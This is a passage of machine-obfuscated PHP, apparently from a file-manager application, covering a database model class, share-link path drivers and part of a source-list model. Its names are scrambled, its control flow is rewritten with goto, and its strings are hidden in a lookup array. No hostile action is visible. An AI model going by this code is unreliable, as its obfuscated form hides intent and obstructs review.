$_SERVER[Ïº«‚ßèÔˆø]; if (!is_bool($BËÅù±¥ì÷) && !is_array($BËÅù±¥ì÷)) { $BËÅù±¥ì÷ = func_get_args(); array_shift($BËÅù±¥ì÷); } $a¦ãç Õ— = str_replace(array($f›¨Ò ñõ[228], $f›¨Ò ñõ[339]), $f›¨Ò ñõ[50], $a¦ãç Õ—); $a¦ãç Õ— = $this->parseSql($a¦ãç Õ—, $BËÅù±¥ì÷); return $this->db->query($a¦ãç Õ—); } public function execute($FğÙÅ Ù¿„, $aÓ–×¦äÏ¼ = false) { if (!is_bool($aÓ–×¦äÏ¼) && !is_array($aÓ–×¦äÏ¼)) { $aÓ–×¦äÏ¼ = func_get_args(); array_shift($aÓ–×¦äÏ¼); } $FğÙÅ Ù¿„ = $this->parseSql($FğÙÅ Ù¿„, $aÓ–×¦äÏ¼); return $this->db->execute($FğÙÅ Ù¿„); } protected function parseSql($DñóÓ½ç¦, $f÷ƒ‡á„ªŞ) { $AÚ›ëˆé„ğ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!0 === $f÷ƒ‡á„ªŞ) { $fˆÁ™ŞÕ“¦ = $this->_parseOptions(); $DñóÓ½ç¦ = $this->db->parseSql($DñóÓ½ç¦, $fˆÁ™ŞÕ“¦); } elseif (is_array($f÷ƒ‡á„ªŞ)) { $f÷ƒ‡á„ªŞ = array_map(array($this->db, $AÚ›ëˆé„ğ[340]), $f÷ƒ‡á„ªŞ); $DñóÓ½ç¦ = vsprintf($DñóÓ½ç¦, $f÷ƒ‡á„ªŞ); } else { $DñóÓ½ç¦ = strtr($DñóÓ½ç¦, array($AÚ›ëˆé„ğ[341] => $this->getTableName(), $AÚ›ëˆé„ğ[342] => think_config($AÚ›ëˆé„ğ[241]))); } $this->db->setModel($this->name); return $DñóÓ½ç¦; } public function db($DšåÎñ¥‰¿ = '', $eˆ„¹¦¯„ë = '', $dÓâğ¡÷£‘ = array()) { goto föªĞ®’™Œ; EôÑ³ÕÔ¨: static $E‘Ø „Œœ = array(); if (!isset($E‘Ø „Œœ[$DšåÎñ¥‰¿]) || isset($E‘Ø „Œœ[$DšåÎñ¥‰¿]) && $eˆ„¹¦¯„ë && $C–ƒ‚µ§à¡[$DšåÎñ¥‰¿] != $eˆ„¹¦¯„ë) { if (!empty($eˆ„¹¦¯„ë) && is_string($eˆ„¹¦¯„ë) && !1 === strpos($eˆ„¹¦¯„ë, $cñ¥Ì“Ò£´[8])) { $eˆ„¹¦¯„ë = think_config($eˆ„¹¦¯„ë); } $E‘Ø „Œœ[$DšåÎñ¥‰¿] = Db::getInstance($eˆ„¹¦¯„ë); } elseif (NULL === $eˆ„¹¦¯„ë) { $E‘Ø „Œœ[$DšåÎñ¥‰¿]->close(); unset($E‘Ø „Œœ[$DšåÎñ¥‰¿]); return; } if (!empty($dÓâğ¡÷£‘)) { if (is_string($dÓâğ¡÷£‘)) { parse_str($dÓâğ¡÷£‘, $dÓâğ¡÷£‘); } foreach ($dÓâğ¡÷£‘ as $F„éĞšƒ´Ä => $Fäºˆ¹ÙÉ³) { $this->setProperty($F„éĞšƒ´Ä, $Fäºˆ¹ÙÉ³); } } goto dÉ¥®ùÛ­ì; A­Ÿˆ×Ó¹É: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto f½­ñ ç»Ş; dÉ¥®ùÛ­ì: $C–ƒ‚µ§à¡[$DšåÎñ¥‰¿] = $eˆ„¹¦¯„ë; $this->db = $E‘Ø „Œœ[$DšåÎñ¥‰¿]; $this->_after_db(); goto A­Ÿˆ×Ó¹É; föªĞ®’™Œ: $cñ¥Ì“Ò£´ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($cñ¥Ì“Ò£´[33] === $DšåÎñ¥‰¿ && $this->db) { return $this->db; } static $C–ƒ‚µ§à¡ = array(); goto EôÑ³ÕÔ¨; f½­ñ ç»Ş: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $D‹º‡†¯¯Ê = get_class($this); if ($D‹º‡†¯¯Ê == $_SERVER[Ïº«‚ßèÔˆø][343]) { return $this->name; } $this->name = substr($D‹º‡†¯¯Ê, 0, -5); } return $this->name; } public function getTableName() { $A®ŠÖ…µÆ­ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($this->trueTableName)) { $eÀß‡ÎÀäÀ = !empty($this->tablePrefix) ? $this->tablePrefix : $A®ŠÖ…µÆ­[33]; if (!empty($this->tableName)) { $eÀß‡ÎÀäÀ .= $this->tableName; } else { $eÀß‡ÎÀäÀ .= think_parse_name($this->name); } $this->trueTableName = strtolower($eÀß‡ÎÀäÀ); } return (!empty($this->dbName) ? $this->dbName . $A®ŠÖ…µÆ­[95] : $A®ŠÖ…µÆ­[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $A™ßá•°Ë” =& $_SERVER[Ïº«‚ßèÔˆø]; return isset($this->fields[$A™ßá•°Ë”[248]]) ? $this->fields[$A™ßá•°Ë”[248]] : $this->pk; } public function getDbFields() { $D÷¬Ã‡ˆÊ =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($this->options[$D÷¬Ã‡ˆÊ[276]])) { $B¾òÒéŸß = $this->db->getFields($this->options[$D÷¬Ã‡ˆÊ[276]]); return $B¾òÒéŸß ? array_keys($B¾òÒéŸß) : !1; } if ($this->fields) { $B¾òÒéŸß = $this->fields; unset($B¾òÒéŸß[$D÷¬Ã‡ˆÊ[247]], $B¾òÒéŸß[$D÷¬Ã‡ˆÊ[248]], $B¾òÒéŸß[$D÷¬Ã‡ˆÊ[249]], $B¾òÒéŸß[$D÷¬Ã‡ˆÊ[246]]); return $B¾òÒéŸß; } return !1; } public function data($FËğ«Şí÷Œ = '') { $FôÃó’‡ö¿ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($FôÃó’‡ö¿[33] === $FËğ«Şí÷Œ && !empty($this->data)) { return $this->data; } if (is_object($FËğ«Şí÷Œ)) { $FËğ«Şí÷Œ = get_object_vars($FËğ«Şí÷Œ); } elseif (is_string($FËğ«Şí÷Œ)) { parse_str($FËğ«Şí÷Œ, $FËğ«Şí÷Œ); } elseif (!is_array($FËğ«Şí÷Œ)) { think_exception(think_lang($FôÃó’‡ö¿[268])); } $this->data = $FËğ«Şí÷Œ; return $this; } public function join($FƒÊ°ñãŠ) { $fËíÚÙÑ¯Ô =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_array($FƒÊ°ñãŠ)) { $this->options[$fËíÚÙÑ¯Ô[279]] = $FƒÊ°ñãŠ; } elseif (!empty($FƒÊ°ñãŠ)) { $this->options[$fËíÚÙÑ¯Ô[279]][] = $FƒÊ°ñãŠ; } return $this; } public function union($c’³½Ò¼é±, $A¹‘Ü×Ë¤È = false) { goto d‹ğöÎ›Œ¸; D…ƒšøª¦è: if (is_object($c’³½Ò¼é±)) { $c’³½Ò¼é± = get_object_vars($c’³½Ò¼é±); } if (is_string($c’³½Ò¼é±)) { $CÈö“¾¶Ç· = $c’³½Ò¼é±; } elseif (is_array($c’³½Ò¼é±)) { if (isset($c’³½Ò¼é±[0])) { $this->options[$E¦Åóº˜ÊÌ[344]] = array_merge($this->options[$E¦Åóº˜ÊÌ[344]], $c’³½Ò¼é±); return $this; } else { $CÈö“¾¶Ç· = $c’³½Ò¼é±; } } else { think_exception(think_lang($E¦Åóº˜ÊÌ[268])); } $this->options[$E¦Åóº˜ÊÌ[344]][] = $CÈö“¾¶Ç·; goto cÄˆÜ¡É‹; cÄˆÜ¡É‹: return $this; goto AŒ˜éºÁ˜; d‹ğöÎ›Œ¸: $E¦Åóº˜ÊÌ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($c’³½Ò¼é±)) { return $this; } if ($A¹‘Ü×Ë¤È) { $this->options[$E¦Åóº˜ÊÌ[344]][$E¦Åóº˜ÊÌ[345]] = !0; } goto D…ƒšøª¦è; AŒ˜éºÁ˜: } public function cache($e¯ƒó—‡Œš = true, $d¢¿¯ê„Êæ = null, $d‡Â·˜ñ¼İ = '') { $E”š­³×…º =& $_SERVER[Ïº«‚ßèÔˆø]; if (!1 !== $e¯ƒó—‡Œš) { $this->options[$E”š­³×…º[346]] = array($E”š­³×…º[93] => $e¯ƒó—‡Œš, $E”š­³×…º[336] => $d¢¿¯ê„Êæ, $E”š­³×…º[29] => $d‡Â·˜ñ¼İ); } return $this; } public function field($c×Æ˜–¥ä°, $cÏÁ†¼‹ = false) { $A‰ƒôõĞÔÏ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!0 === $c×Æ˜–¥ä°) { $AŠ±Ş¤è‘Ì = $this->getDbFields(); $c×Æ˜–¥ä° = $AŠ±Ş¤è‘Ì ? $AŠ±Ş¤è‘Ì : $A‰ƒôõĞÔÏ[182]; } elseif ($cÏÁ†¼‹) { if (is_string($c×Æ˜–¥ä°)) { $c×Æ˜–¥ä° = explode($A‰ƒôõĞÔÏ[47], $c×Æ˜–¥ä°); } $AŠ±Ş¤è‘Ì = $this->getDbFields(); $c×Æ˜–¥ä° = $AŠ±Ş¤è‘Ì ? array_diff($AŠ±Ş¤è‘Ì, $c×Æ˜–¥ä°) : $c×Æ˜–¥ä°; } $this->options[$A‰ƒôõĞÔÏ[270]] = $c×Æ˜–¥ä°; return $this; } public function scope($Bé…”ŒÖ = '', $aï²§¼Š°‰ = NULL) { $F¸ÜäÇ†É =& $_SERVER[Ïº«‚ßèÔˆø]; if ($F¸ÜäÇ†É[33] === $Bé…”ŒÖ) { if (isset($this->_scope[$F¸ÜäÇ†É[34]])) { $A„§’Ãô»¶ = $this->_scope[$F¸ÜäÇ†É[34]]; } else { return $this; } } elseif (is_string($Bé…”ŒÖ)) { $D¦ñ»Õ¸Ú© = explode($F¸ÜäÇ†É[47], $Bé…”ŒÖ); $A„§’Ãô»¶ = array(); foreach ($D¦ñ»Õ¸Ú© as $aøâœö¤… ) { if (!isset($this->_scope[$aøâœö¤… ])) { continue; } $A„§’Ãô»¶ = array_merge($A„§’Ãô»¶, $this->_scope[$aøâœö¤… ]); } if (!empty($aï²§¼Š°‰) && is_array($aï²§¼Š°‰)) { $A„§’Ãô»¶ = array_merge($A„§’Ãô»¶, $aï²§¼Š°‰); } } elseif (is_array($Bé…”ŒÖ)) { $A„§’Ãô»¶ = $Bé…”ŒÖ; } if (is_array($A„§’Ãô»¶) && !empty($A„§’Ãô»¶)) { $this->options = array_merge($this->options, array_change_key_case($A„§’Ãô»¶)); } return $this; } public function where($A‹ø’¹‘ÈÄ, $dª÷ÏĞ¾  = null) { $aƒ”¤œŠîŸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!is_null($dª÷ÏĞ¾ ) && is_string($A‹ø’¹‘ÈÄ)) { if (!is_array($dª÷ÏĞ¾ )) { $dª÷ÏĞ¾  = func_get_args(); array_shift($dª÷ÏĞ¾ ); } $dª÷ÏĞ¾  = array_map(array($this->db, $aƒ”¤œŠîŸ[340]), $dª÷ÏĞ¾ ); $A‹ø’¹‘ÈÄ = vsprintf($A‹ø’¹‘ÈÄ, $dª÷ÏĞ¾ ); } elseif (is_object($A‹ø’¹‘ÈÄ)) { $A‹ø’¹‘ÈÄ = get_object_vars($A‹ø’¹‘ÈÄ); } elseif (is_array($A‹ø’¹‘ÈÄ)) { foreach ($A‹ø’¹‘ÈÄ as $aˆæÌ­´æ¹ => $b„µù„ÉáË) { if ((is_numeric($aˆæÌ­´æ¹) || !$aˆæÌ­´æ¹) && is_string($b„µù„ÉáË)) { if (strpos($b„µù„ÉáË, $aƒ”¤œŠîŸ[347]) === 0) { continue; } think_trace($aƒ”¤œŠîŸ[348], $aƒ”¤œŠîŸ[33], $aƒ”¤œŠîŸ[46]); die; } } } if (is_string($A‹ø’¹‘ÈÄ) && $aƒ”¤œŠîŸ[33] != $A‹ø’¹‘ÈÄ) { $fŞîà©”À­ = array(); $fŞîà©”À­[$aƒ”¤œŠîŸ[349]] = $A‹ø’¹‘ÈÄ; $A‹ø’¹‘ÈÄ = $fŞîà©”À­; } if (isset($this->options[$aƒ”¤œŠîŸ[272]])) { $this->options[$aƒ”¤œŠîŸ[272]] = array_merge($this->options[$aƒ”¤œŠîŸ[272]], $A‹ø’¹‘ÈÄ); } else { $this->options[$aƒ”¤œŠîŸ[272]] = $A‹ø’¹‘ÈÄ; } return $this; } public function limit($AÙ×İ¿õÚ—, $fƒİŒ¯¾Ë = null) { $bİªñ†¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->options[$bİªñ†¨[289]] = is_null($fƒİŒ¯¾Ë) ? $AÙ×İ¿õÚ— : $AÙ×İ¿õÚ— . $bİªñ†¨[47] . $fƒİŒ¯¾Ë; return $this; } public function page($AÕÒá…è¢…, $C“÷¤çƒÆ = null) { $eëÄ—±˜æê =& $_SERVER[Ïº«‚ßèÔˆø]; $this->options[$eëÄ—±˜æê[350]] = is_null($C“÷¤çƒÆ) ? $AÕÒá…è¢… : $AÕÒá…è¢… . $eëÄ—±˜æê[47] . $C“÷¤çƒÆ; return $this; } public function comment($E„ÍèõÎÂò) { $this->options[$_SERVER[Ïº«‚ßèÔˆø][351]] = $E„ÍèõÎÂò; return $this; } public function setProperty($e†«„Ö¥ï, $fÁñ‡´ÄŞ‚) { if (property_exists($this, $e†«„Ö¥ï)) { $this->{$e†«„Ö¥ï} = $fÁñ‡´ÄŞ‚; } return $this; } } goto dÓ‰õö”Ü; aÌƒÖã™Èñ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($EÎà¯š“•») { $this->pathParse = $EÎà¯š“•»; $this->model = Model($_SERVER[Ïº«‚ßèÔˆø][1187]); } protected function infoParse($BÂ¿Ê‰éÖù, $f¤ŒË¾Ó¨Ë = false, $aŸÏÀ»¬Âé = false) { $aùîç·Àå® =& $_SERVER[Ïº«‚ßèÔˆø]; return Action($aùîç·Àå®[1053])->sharePathInfo($this->pathParse[$aùîç·Àå®[76]], !0); } public function listPath($e¿ª¶šà®é, $D’Ò¶…é¹ = false) { $e¡©…àëÑŒ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fªƒ™Ğ÷²¬ = parent::listPath($e¿ª¶šà®é, $D’Ò¶…é¹); foreach ($Fªƒ™Ğ÷²¬ as $Cò¨…°ó…Ã => $B¯“–áá¹‰) { if (!in_array($Cò¨…°ó…Ã, array($e¡©…àëÑŒ[74], $e¡©…àëÑŒ[75]))) { continue; } foreach ($B¯“–áá¹‰ as $bÓ‰Õ¬×‚ => $e³Õ’Ò™¦¾) { $Fªƒ™Ğ÷²¬[$Cò¨…°ó…Ã][$bÓ‰Õ¬×‚] = Action($e¡©…àëÑŒ[1053])->shareItemInfo($e³Õ’Ò™¦¾); } } return $Fªƒ™Ğ÷²¬; } public function listAll($f±ÉÂ³Ã¾³) { goto Aù©ğ®¼Ùš; dÂÖÏ…‡Ø: return $B¶³˜ŒÏ°Å; goto Bã´ãîÀ—À; F”ìšÓ…â: $B¶³˜ŒÏ°Å = $this->model->listAll($f±ÉÂ³Ã¾³); foreach ($B¶³˜ŒÏ°Å as &$DŠš©âÌµÀ) { $DŠš©âÌµÀ[$cİÍ÷¥¥‡[85]] = Action($cİÍ÷¥¥‡[1053])->shareItemInfo($DŠš©âÌµÀ[$cİÍ÷¥¥‡[85]]); } unset($DŠš©âÌµÀ); goto dÂÖÏ…‡Ø; Aù©ğ®¼Ùš: $cİÍ÷¥¥‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÏÎ„Ğ›­ = IO::info($this->pathParse[$cİÍ÷¥¥‡[76]]); if (!$DÏÎ„Ğ›­) { return array(); } goto F”ìšÓ…â; Bã´ãîÀ—À: } } class PathDriverDriverShareItem { public function __construct($EŒÍĞ¢ñ½) { $this->pathParse = $EŒÍĞ¢ñ½; } public function __call($eÊÚÑÓÅªí, $côÅö“çß) { $AÅö‡±´ºÒ =& $_SERVER[Ïº«‚ßèÔˆø]; if (method_exists($this, $eÊÚÑÓÅªí)) { return; } $f¬§ŠìÑĞˆ = call_user_func_array(array($AÅö‡±´ºÒ[1196], $eÊÚÑÓÅªí), $côÅö“çß); $e—Úé¸·áæ = array($AÅö‡±´ºÒ[1197], $AÅö‡±´ºÒ[1198], $AÅö‡±´ºÒ[1199], $AÅö‡±´ºÒ[1200], $AÅö‡±´ºÒ[517], $AÅö‡±´ºÒ[519], $AÅö‡±´ºÒ[1201], $AÅö‡±´ºÒ[107], $AÅö‡±´ºÒ[1202], $AÅö‡±´ºÒ[1203]); if (in_array($eÊÚÑÓÅªí, $e—Úé¸·áæ)) { $f¬§ŠìÑĞˆ = $this->getPathOuter($f¬§ŠìÑĞˆ); } return $f¬§ŠìÑĞˆ; } public function copy($f¼ê£é’ª, $fùâªÓ„ñ‹, $däà¸ƒóï = false) { return $this->copyMove($f¼ê£é’ª, $fùâªÓ„ñ‹, $däà¸ƒóï, $_SERVER[Ïº«‚ßèÔˆø][517]); } public function move($fáÉÆ¤®ØÑ, $Dœ·ÔÍ“Á, $fó‰ÕÃãŠ = false) { return $this->copyMove($fáÉÆ¤®ØÑ, $Dœ·ÔÍ“Á, $fó‰ÕÃãŠ, $_SERVER[Ïº«‚ßèÔˆø][519]); } private function copyMove($D„ñ½ ÈÑŸ, $b™£œˆÌ‚¾, $fŠÇŞ¾Õáñ, $eùË±Ä»§) { goto aª¦±š³Ï»; aª¦±š³Ï»: $e·˜šèÔ‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $Bâ°ŒÖÌÓÎ = $b™£œˆÌ‚¾; $FˆÓ…“ğè = IO::driverMake($b™£œˆÌ‚¾); goto aÓ«— ˜å; aÓ«— ˜å: if ($FˆÓ…“ğè->pathParse[$e·˜šèÔ‘[1031]]) { $b™£œˆÌ‚¾ = $FˆÓ…“ğè->pathParse[$e·˜šèÔ‘[1031]]; } else { $b™£œˆÌ‚¾ = $Bâ°ŒÖÌÓÎ; } $DğÉ˜Ùí¿¨ = IO::copyMove($D„ñ½ ÈÑŸ, $b™£œˆÌ‚¾, $fŠÇŞ¾Õáñ, $eùË±Ä»§); $DğÉ˜Ùí¿¨ = $this->getPathOuter($DğÉ˜Ùí¿¨); goto B‰Ò¶Ë´¹; B‰Ò¶Ë´¹: return $DğÉ˜Ùí¿¨; goto Eî‹ÏØ”ŠÙ; Eî‹ÏØ”ŠÙ: } public function pathThis($B¿â­·•ë) { return get_path_this($this->pathParse[$_SERVER[Ïº«‚ßèÔˆø][76]]); } public function pathFather($Eëùñ ¡àŠ) { return get_path_father($this->pathParse[$_SERVER[Ïº«‚ßèÔˆø][76]]); } public function iconvSystem($C¾¨¥Øò…) { return $C¾¨¥Øò…; } protected function infoParse($b¨•ÇÃœæ, $d¯ë—±ôÙ¤ = false) { $e†®â»ï»Ê =& $_SERVER[Ïº«‚ßèÔˆø]; $E…ö¢â½°À = $this->pathParse[$e†®â»ï»Ê[464]][$e†®â»ï»Ê[1054]] . $this->pathParse[$e†®â»ï»Ê[1047]]; if ($d¯ë—±ôÙ¤) { $aÔ¤Õæ©· = IO::infoWithChildren($E…ö¢â½°À); } else { $aÔ¤Õæ©· = IO::info($E…ö¢â½°À); } $bä¸Ä™§Á¨ = $this->pathParse[$e†®â»ï»Ê[464]]; return Action($e†®â»ï»Ê[1195])->_shareItemeParse($aÔ¤Õæ©·, $bä¸Ä™§Á¨); } public function listAll($Eù–œÊÓ‰£) { $f§ÚğêÇö³ =& $_SERVER[Ïº«‚ßèÔˆø]; $aÉÁÏ†ªÚ† = IO::listAll($Eù–œÊÓ‰£); $e¢Ü‹«ëä = $this->pathParse[$f§ÚğêÇö³[464]]; foreach ($aÉÁÏ†ªÚ† as &$F­ÑÂè’”) { check_abort(); $DóÛÈó¾Á = IO::info($F­ÑÂè’”[$f§ÚğêÇö³[76]]); $DóÛÈó¾Á = is_array($DóÛÈó¾Á) ? $DóÛÈó¾Á : array(); $F­ÑÂè’” = array_merge($DóÛÈó¾Á, $F­ÑÂè’”); $F­ÑÂè’”[$f§ÚğêÇö³[85]] = Action($f§ÚğêÇö³[1195])->_shareItemeParse($F­ÑÂè’”, $e¢Ü‹«ëä); } unset($F­ÑÂè’”); return $aÉÁÏ†ªÚ†; } public function getPathOuter($eÄ×‰òã‡) { goto b¥Ù®à”¶Ä; b¥Ù®à”¶Ä: $c££ìß’¯‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $F¹³ëŞğï = KodIO::parse($eÄ×‰òã‡); if ($F¹³ëŞğï[$c££ìß’¯‰[29]] == KodIO::KOD_SHARE_ITEM) { return $F¹³ëŞğï[$c££ìß’¯‰[76]]; } goto fø—ŠŒœÁ; fø—ŠŒœÁ: $eÂîš»èÂÙ = KodIO::clear($eÄ×‰òã‡); $C”çè­¨ôÂ = KodIO::clear($this->pathParse[$c££ìß’¯‰[464]][$c££ìß’¯‰[1054]]); $DÚôí…’»Õ = substr($eÂîš»èÂÙ, strlen($C”çè­¨ôÂ)); goto E§÷Ïƒ‚Äì; E§÷Ïƒ‚Äì: if (substr($eÂîš»èÂÙ, 0, strlen($C”çè­¨ôÂ)) != $C”çè­¨ôÂ) { return !1; } return $this->pathParse[$c££ìß’¯‰[1048]] . $c££ìß’¯‰[8] . ltrim($DÚôí…’»Õ, $c££ìß’¯‰[8]); goto FÁ¡˜ÌîÂº; FÁ¡˜ÌîÂº: } public function getType() { $fŞ·±ÄÀô =& $_SERVER[Ïº«‚ßèÔˆø]; $CïÑÅŞÕØÇ = str_replace($fŞ·±ÄÀô[72], $fŞ·±ÄÀô[33], get_class($this)); return strtolower($CïÑÅŞÕØÇ); } public function isTypeObject($B¼ĞĞêø¢ä) { return IO::isTypeObject($B¼ĞĞêø¢ä); } public function info($dÈÁÍÆÜŠ“) { return $this->infoParse($dÈÁÍÆÜŠ“); } public function infoAuth($fÆ¶ê´ºÍ”) { return $this->infoParse($fÆ¶ê´ºÍ”); } public function infoWithChildren($F™†¡ç­’—) { return $this->infoParse($F™†¡ç­’—, !0); } public function infoFull($C¶®¤¨È”„) { return $this->infoParse($C¶®¤¨È”„); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($cã¼ÚŠ‡Û™) { $this->pathParse = $cã¼ÚŠ‡Û™; } protected function infoParse($eÄÁ´“Âå, $E¾Ù¼æÒôò = false) { $C’›’ÙÂ‚· =& $_SERVER[Ïº«‚ßèÔˆø]; return Action($C’›’ÙÂ‚·[1053])->sharePathInfo($this->pathParse[$C’›’ÙÂ‚·[76]], !0, $E¾Ù¼æÒôò); } public function listPath($e›Úê†„ò, $aàë‘Öõøå = false) { $E×‹ÀåÒÏ¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $fĞ¸…†Æİˆ = IO::listPath($e›Úê†„ò, $aàë‘Öõøå); foreach ($fĞ¸…†Æİˆ as $a¥‰¶ŠÉñ‘ => $F’¦ŞÑä–¹) { if (!in_array($a¥‰¶ŠÉñ‘, array($E×‹ÀåÒÏ¬[74], $E×‹ÀåÒÏ¬[75]))) { continue; } foreach ($F’¦ŞÑä–¹ as $fŒ®Ç¥à„ => $Cöæ¼ì…) { $Cöæ¼ì… = Action($E×‹ÀåÒÏ¬[1204])->parsePathChildren($Cöæ¼ì…, array($E×‹ÀåÒÏ¬[412] => $e›Úê†„ò)); $fĞ¸…†Æİˆ[$a¥‰¶ŠÉñ‘][$fŒ®Ç¥à„] = Action($E×‹ÀåÒÏ¬[1053])->shareItemInfo($Cöæ¼ì…); } } return $fĞ¸…†Æİˆ; } public function listAll($E²›ˆ‹–ãŒ) { $F¦í¹öˆöÍ =& $_SERVER[Ïº«‚ßèÔˆø]; $B³„÷¶ªˆ = IO::listAll($E²›ˆ‹–ãŒ); foreach ($B³„÷¶ªˆ as &$DÊ­¼¿ëáë) { $f²Ì¹“”¦é = IO::info($DÊ­¼¿ëáë[$F¦í¹öˆöÍ[76]]); $f²Ì¹“”¦é = is_array($f²Ì¹“”¦é) ? $f²Ì¹“”¦é : array(); $DÊ­¼¿ëáë = array_merge($f²Ì¹“”¦é, $DÊ­¼¿ëáë); $DÊ­¼¿ëáë[$F¦í¹öˆöÍ[85]] = Action($F¦í¹öˆöÍ[1053])->shareItemInfo($DÊ­¼¿ëáë); } unset($DÊ­¼¿ëáë); return $B³„÷¶ªˆ; } } goto eõò«½™¾ä; cÖç°œÇ: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\x65"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\x6d\145" => "\x69\157\137\163\157\x75\x72\x63\x65\137\x6d\x65\164\141", "\155\145\x74\x61\x46\x69\145\154\x64" => "\163\157\165\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\x69\x6d\145", "\x74\151\155\145", "\151\156\163\145\162\164", "\x66\165\156\x63\x74\151\157\x6e"), array("\x63\x72\x65\141\164\145\124\151\155\145", "\x74\151\x6d\145", "\151\x6e\163\145\x72\164", "\x66\165\x6e\143\164\151\157\x6e"), array("\x76\151\x65\x77\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\x74", "\146\165\x6e\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($e Œ£Ìº‰) { return $this->listSource(array($_SERVER[Ïº«‚ßèÔˆø][393] => $e Œ£Ìº‰)); } public function typeName($B”×ùé›‡Œ) { static $Eİå•„÷¦ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\x6d", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $Eİå•„÷¦[$B”×ùé›‡Œ . $_SERVER[Ïº«‚ßèÔˆø][33]]; } public function sourceListInfo($BÙÓÅ”·”, $DçŒ‘¦¾ˆÒ = false) { goto bµ‹õîë‰Œ; BÑæõé„‰º: return array_to_keyvalue($DèéÍ­œ…, $B„÷ä°Û¾²[394]); goto CŒƒÖ¶¼²ª; bµ‹õîë‰Œ: $B„÷ä°Û¾² =& $_SERVER[Ïº«‚ßèÔˆø]; $BÙÓÅ”·” = $BÙÓÅ”·” ? $BÙÓÅ”·” : array(); $BÙÓÅ”·” = array_filter(array_unique($BÙÓÅ”·”)); goto bƒ ÚÅ¨Á; bƒ ÚÅ¨Á: if (!$BÙÓÅ”·”) { return array(); } $DèéÍ­œ… = $this->where(array($B„÷ä°Û¾²[394] => array($B„÷ä°Û¾²[7], $BÙÓÅ”·”)))->select(); $this->_listDataApply($DèéÍ­œ…, $DçŒ‘¦¾ˆÒ); goto BÑæõé„‰º; CŒƒÖ¶¼²ª: } public function pathInfoFilter(&$CØÈÒ¨Ü®) { goto B„Ü —Íë˜; e™ì×Åí·: if (isset($CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[404]]) && $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[404]][$CœÅ²ŒèÙÂ[405]] == -1) { $B°ÒÓ¢£š‹ = $EíÇ„ƒÑÁõ; } $CØÈÒ¨Ü® = array_field_key($CØÈÒ¨Ü®, $B°ÒÓ¢£š‹); return $CØÈÒ¨Ü®; goto AßÀ¤•Ùª¹; B„Ü —Íë˜: $CœÅ²ŒèÙÂ =& $_SERVER[Ïº«‚ßèÔˆø]; static $DÚ–ÑÒ·•Ó = false; static $EíÇ„ƒÑÁõ = false; goto dÙŠóã¸¨™; DÉ•ƒ : $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[402]] = $this->typeName($CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[402]]); if ($CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[401]] != 1) { $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[168]] = $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[403]]; unset($CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[403]]); } $B°ÒÓ¢£š‹ = $DÚ–ÑÒ·•Ó; goto e™ì×Åí·; dÙŠóã¸¨™: if (!$DÚ–ÑÒ·•Ó) { goto BÎ–ŸÍ†Ò; D‡Ìù½À¡¡: $D¿³÷ââµè = $CœÅ²ŒèÙÂ[398]; $E°êİ¨š®Ë = explode($CœÅ²ŒèÙÂ[47], $D¿³÷ââµè); $DÚ–ÑÒ·•Ó = explode($CœÅ²ŒèÙÂ[47], $d–²„‡ã•); goto D×Šº“ä…‰; D×Šº“ä…‰: $EíÇ„ƒÑÁõ = array(); foreach ($DÚ–ÑÒ·•Ó as $Aï”òÓ·Ş¦) { if (in_array($Aï”òÓ·Ş¦, $E°êİ¨š®Ë)) { continue; } $EíÇ„ƒÑÁõ[] = $Aï”òÓ·Ş¦; } goto A”ëÌ¡í³; BÎ–ŸÍ†Ò: $d–²„‡ã• = $CœÅ²ŒèÙÂ[395]; $d–²„‡ã• .= $CœÅ²ŒèÙÂ[396]; $d–²„‡ã• .= $CœÅ²ŒèÙÂ[397]; goto D‡Ìù½À¡¡; A”ëÌ¡í³: } $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[76]] = $CœÅ²ŒèÙÂ[399] . $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[394]] . $CœÅ²ŒèÙÂ[400]; $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[29]] = $CØÈÒ¨Ü®[$CœÅ²ŒèÙÂ[401]] == 1 ? 